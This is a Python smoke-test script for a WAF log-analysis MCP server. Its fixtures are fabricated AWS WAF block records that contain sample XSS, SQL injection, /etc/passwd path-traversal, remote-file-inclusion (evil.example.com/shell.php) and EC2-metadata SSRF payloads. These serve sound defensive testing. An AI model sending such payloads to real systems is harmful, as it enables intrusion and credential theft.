"""
Smoke-test for the WAF MCP tools.

Tests public tools across AWS WAF scenarios:
  - Multiple managed rule groups (CRS, SQLi, Bot Control)
  - BLOCK and COUNT actions
  - Different HTTP methods, URI patterns, and injection locations
  - Malformed / incomplete log handling
  - Direct rule explanation and docs lookup tools

Run from the repo root:
    python -m waf-mcp.scripts.smoke_test
or from waf-mcp/:
    python scripts/smoke_test.py

A markdown report is written to smoke_test_report.md after every run.
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import textwrap
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.mcp_server import (
    analyze_waf_log,
    check_ollama_health,
    explain_block_reason,
    lookup_aws_waf_rule_docs,
)

# ──────────────────────────────────────────────────────────────────────────────
# WAF log fixtures
# ──────────────────────────────────────────────────────────────────────────────

def _base(
    rule_id: str,
    rule_type: str = "MANAGED_RULE_GROUP",
    method: str = "GET",
    uri: str = "/",
    args: str = "",
    headers: list[dict] | None = None,
    action: str = "BLOCK",
) -> dict[str, Any]:
    return {
        "timestamp": 1715000000000,
        "action": action,
        "terminatingRuleId": rule_id,
        "terminatingRuleType": rule_type,
        "httpRequest": {
            "clientIp": "198.51.100.77",
            "country": "US",
            "httpMethod": method,
            "uri": uri,
            "args": args,
            "headers": headers or [
                {"name": "Host", "value": "shop.example.com"},
                {"name": "User-Agent", "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                {"name": "Accept", "value": "text/html,application/xhtml+xml"},
            ],
        },
        "ruleGroupList": [],
        "nonTerminatingMatchingRules": [],
    }


SCENARIOS: list[tuple[str, dict[str, Any]]] = [
    (
        "XSS in POST body",
        _base("CrossSiteScripting_BODY", method="POST", uri="/api/comments",
              headers=[{"name": "Host", "value": "blog.example.com"},
                       {"name": "Content-Type", "value": "application/json"},
                       {"name": "User-Agent", "value": "Mozilla/5.0"}]),
    ),
    (
        "XSS in query string",
        _base("CrossSiteScripting_QUERYARGUMENTS", uri="/search",
              args="q=<script>alert(document.cookie)</script>"),
    ),
    (
        "SQL injection in query args",
        _base("SQLi_QUERYARGUMENTS", uri="/products", args="id=1' OR '1'='1' --"),
    ),
    (
        "SQL injection in POST body",
        _base("SQLi_BODY", method="POST", uri="/api/login",
              headers=[{"name": "Host", "value": "app.example.com"},
                       {"name": "Content-Type", "value": "application/x-www-form-urlencoded"},
                       {"name": "User-Agent", "value": "Mozilla/5.0"}]),
    ),
    (
        "Local file inclusion in URI path",
        _base("GenericLFI_URIPATH", uri="/download/../../../../etc/passwd"),
    ),
    (
        "Remote file inclusion in query args",
        _base("GenericRFI_QUERYARGUMENTS", uri="/page",
              args="template=http://evil.example.com/shell.php"),
    ),
    (
        "SSRF targeting EC2 metadata",
        _base("EC2MetaDataSSRF_QUERYARGUMENTS", uri="/fetch",
              args="url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ),
    (
        "Oversized request body",
        _base("SizeRestrictions_BODY", method="POST", uri="/api/upload",
              headers=[{"name": "Host", "value": "app.example.com"},
                       {"name": "Content-Type", "value": "application/octet-stream"},
                       {"name": "Content-Length", "value": "10485760"},
                       {"name": "User-Agent", "value": "Mozilla/5.0"}]),
    ),
    (
        "Restricted file extension (.env)",
        _base("RestrictedExtensions_URIPATH", uri="/.env"),
    ),
    (
        "Missing User-Agent header",
        _base("NoUserAgent_HEADER",
              headers=[{"name": "Host", "value": "api.example.com"},
                       {"name": "Accept", "value": "*/*"}]),
    ),
    (
        "Known bad-bot User-Agent",
        _base("UserAgent_BadBots_HEADER",
              headers=[{"name": "Host", "value": "example.com"},
                       {"name": "User-Agent", "value": "masscan/1.0"}]),
    ),
    (
        "Non-browser User-Agent signal",
        _base("SignalNonBrowserUserAgent",
              headers=[{"name": "Host", "value": "example.com"},
                       {"name": "User-Agent", "value": "python-requests/2.31.0"}]),
    ),
    (
        "Rate-based rule (login flood)",
        _base("LoginFloodRateRule", rule_type="RATE_BASED", method="POST", uri="/auth/login",
              headers=[{"name": "Host", "value": "app.example.com"},
                       {"name": "Content-Type", "value": "application/json"},
                       {"name": "User-Agent", "value": "Mozilla/5.0"}]),
    ),
    (
        "XSS detected but only counted (not blocked)",
        _base("CrossSiteScripting_COOKIE", action="COUNT",
              headers=[{"name": "Host", "value": "example.com"},
                       {"name": "Cookie", "value": "session=abc; next=<img src=x onerror=alert(1)>"},
                       {"name": "User-Agent", "value": "Mozilla/5.0"}]),
    ),
    (
        "ATP credential stuffing rule",
        _base("VolumetricIpHigh", method="POST", uri="/login"),
    ),
]

EDGE_CASES: list[tuple[str, str]] = [
    ("Completely empty JSON object", "{}"),
    (
        "Missing httpRequest field",
        json.dumps({"timestamp": 1715000000000, "action": "BLOCK",
                    "terminatingRuleId": "SQLi_BODY", "terminatingRuleType": "MANAGED_RULE_GROUP"}),
    ),
    ("Not JSON at all", "this is not json }{"),
    (
        "action is ALLOW",
        json.dumps(_base("CrossSiteScripting_BODY", action="ALLOW")),
    ),
]

RULE_EXPLAIN_CASES: list[tuple[str, str]] = [
    ("SQLi_QUERYARGUMENTS", "MANAGED_RULE_GROUP"),
    ("CrossSiteScripting_BODY", "MANAGED_RULE_GROUP"),
    ("GenericLFI_URIPATH", "MANAGED_RULE_GROUP"),
    ("VolumetricIpHigh", "MANAGED_RULE_GROUP"),
]


# ──────────────────────────────────────────────────────────────────────────────
# Data model
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Result:
    label: str
    passed: bool
    elapsed: float
    input_context: str   # human-readable description of what was passed in
    output: str          # full raw output from the tool
    error: str = ""


@dataclass
class Suite:
    name: str
    results: list[Result] = field(default_factory=list)

    def add(self, r: Result) -> None:
        self.results.append(r)

    @property
    def passed(self) -> int:
        return sum(1 for r in self.results if r.passed)

    @property
    def failed(self) -> int:
        return len(self.results) - self.passed


# ──────────────────────────────────────────────────────────────────────────────
# Console helpers
# ──────────────────────────────────────────────────────────────────────────────

def _header(title: str) -> None:
    print(f"\n{'═' * 72}")
    print(f"  {title}")
    print("═" * 72)


def _print_result(r: Result, verbose: bool = False) -> None:
    icon = "✓" if r.passed else "✗"
    status = "PASS" if r.passed else "FAIL"
    print(f"\n  [{icon}] {status}  ({r.elapsed:.2f}s)  {r.label}")
    if r.error:
        print(f"      ERROR: {r.error}")
    if verbose or not r.passed:
        wrapped = textwrap.indent(textwrap.fill(r.output[:600], width=80), prefix="      ")
        print(wrapped)
        if len(r.output) > 600:
            print("      [… truncated]")


# ──────────────────────────────────────────────────────────────────────────────
# Runner helpers
# ──────────────────────────────────────────────────────────────────────────────

async def _run(label: str, input_context: str, coro) -> Result:
    t0 = time.perf_counter()
    try:
        output = await coro
        elapsed = time.perf_counter() - t0
        passed = bool(output and len(output.strip()) > 20)
        return Result(label=label, passed=passed, elapsed=elapsed,
                      input_context=input_context, output=output or "")
    except Exception as exc:
        elapsed = time.perf_counter() - t0
        return Result(label=label, passed=False, elapsed=elapsed,
                      input_context=input_context, output="", error=str(exc))


async def _run_edge(label: str, raw_log: str) -> Result:
    t0 = time.perf_counter()
    try:
        output = await analyze_waf_log(raw_log)
        elapsed = time.perf_counter() - t0
        passed = bool(output and output.strip())
        return Result(label=label, passed=passed, elapsed=elapsed,
                      input_context=raw_log, output=output or "")
    except Exception as exc:
        elapsed = time.perf_counter() - t0
        return Result(label=label, passed=False, elapsed=elapsed,
                      input_context=raw_log, output="", error=str(exc))


# ──────────────────────────────────────────────────────────────────────────────
# Test suites
# ──────────────────────────────────────────────────────────────────────────────

async def suite_health() -> Suite:
    s = Suite("Ollama Health")
    _header(s.name)
    t0 = time.perf_counter()
    raw = await check_ollama_health()
    elapsed = time.perf_counter() - t0
    passed = "ollama_status" in raw
    r = Result("check_ollama_health", passed=passed, elapsed=elapsed,
               input_context="check_ollama_health() — no arguments", output=raw)
    s.add(r)
    _print_result(r, verbose=True)
    return s


async def suite_analyze_logs() -> Suite:
    s = Suite("analyze_waf_log — realistic scenarios")
    _header(s.name)
    for label, log in SCENARIOS:
        raw_json = json.dumps(log, indent=2)
        r = await _run(label, raw_json, analyze_waf_log(json.dumps(log)))
        s.add(r)
        _print_result(r)
    return s


async def suite_edge_cases() -> Suite:
    s = Suite("analyze_waf_log — edge / error cases")
    _header(s.name)
    for label, raw in EDGE_CASES:
        r = await _run_edge(label, raw)
        s.add(r)
        _print_result(r)
    return s


async def suite_explain_rules() -> Suite:
    s = Suite("explain_block_reason")
    _header(s.name)
    for rule_id, rule_type in RULE_EXPLAIN_CASES:
        input_ctx = f"rule_id={rule_id!r}  rule_type={rule_type!r}"
        r = await _run(
            f"explain_block_reason({rule_id})",
            input_ctx,
            explain_block_reason(rule_id, rule_type),
        )
        s.add(r)
        _print_result(r)
    return s


async def suite_docs_lookup() -> Suite:
    s = Suite("lookup_aws_waf_rule_docs")
    _header(s.name)
    for rule_id, _ in RULE_EXPLAIN_CASES:
        input_ctx = f"rule_id={rule_id!r}"
        r = await _run(
            f"lookup_aws_waf_rule_docs({rule_id})",
            input_ctx,
            lookup_aws_waf_rule_docs(rule_id),
        )
        s.add(r)
        _print_result(r)
    return s


# ──────────────────────────────────────────────────────────────────────────────
# Markdown report
# ──────────────────────────────────────────────────────────────────────────────

def _md_escape(text: str) -> str:
    """Prevent accidental markdown rendering inside code fences."""
    return text.replace("```", "` ` `")


def _write_report(suites: list[Suite], path: str) -> None:
    total_pass = sum(s.passed for s in suites)
    total_fail = sum(s.failed for s in suites)
    total = total_pass + total_fail
    run_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    lines: list[str] = []

    lines += [
        "# WAF MCP Smoke Test Report",
        "",
        f"**Run at:** {run_at}  ",
        f"**Result:** {'✅ All passed' if total_fail == 0 else f'❌ {total_fail} failed'}  ",
        f"**Total:** {total_pass} passed / {total_fail} failed / {total} total",
        "",
        "---",
        "",
        "## Summary",
        "",
        "| Suite | Passed | Failed | Status |",
        "|-------|-------:|-------:|--------|",
    ]

    for s in suites:
        icon = "✅" if s.failed == 0 else "❌"
        lines.append(f"| {s.name} | {s.passed} | {s.failed} | {icon} |")

    lines += ["", "---", ""]

    for s in suites:
        lines += [f"## {s.name}", ""]

        for r in s.results:
            badge = "✅ PASS" if r.passed else "❌ FAIL"
            lines += [
                f"### {r.label}",
                "",
                f"**Status:** {badge} &nbsp; **Time:** {r.elapsed:.2f}s",
                "",
                "**Input**",
                "",
                "```",
                _md_escape(r.input_context.strip()),
                "```",
                "",
                "**Output**",
                "",
            ]

            if r.error:
                lines += [
                    "```",
                    f"ERROR: {_md_escape(r.error)}",
                    "```",
                ]
            elif r.output.strip():
                lines += [
                    "```",
                    _md_escape(r.output.strip()),
                    "```",
                ]
            else:
                lines.append("*(no output)*")

            lines.append("")

        lines += ["---", ""]

    report = "\n".join(lines)

    with open(path, "w", encoding="utf-8") as fh:
        fh.write(report)

    print(f"\n  📄 Report written → {path}")


# ──────────────────────────────────────────────────────────────────────────────
# Console summary
# ──────────────────────────────────────────────────────────────────────────────

def _summary(suites: list[Suite]) -> None:
    _header("SUMMARY")
    total_pass = total_fail = 0
    for s in suites:
        icon = "✓" if s.failed == 0 else "✗"
        print(f"  [{icon}]  {s.name:<45}  {s.passed} passed  {s.failed} failed")
        total_pass += s.passed
        total_fail += s.failed
    print(f"\n  Total: {total_pass} passed, {total_fail} failed")
    print("═" * 72)
    if total_fail:
        sys.exit(1)


# ──────────────────────────────────────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────────────────────────────────────

async def main() -> None:
    suites = [
        await suite_health(),
        await suite_analyze_logs(),
        await suite_edge_cases(),
        await suite_explain_rules(),
        await suite_docs_lookup(),
    ]

    # Write markdown report next to this script
    report_path = os.path.join(os.path.dirname(__file__), "smoke_test_report.md")
    _write_report(suites, report_path)

    _summary(suites)


if __name__ == "__main__":
    asyncio.run(main())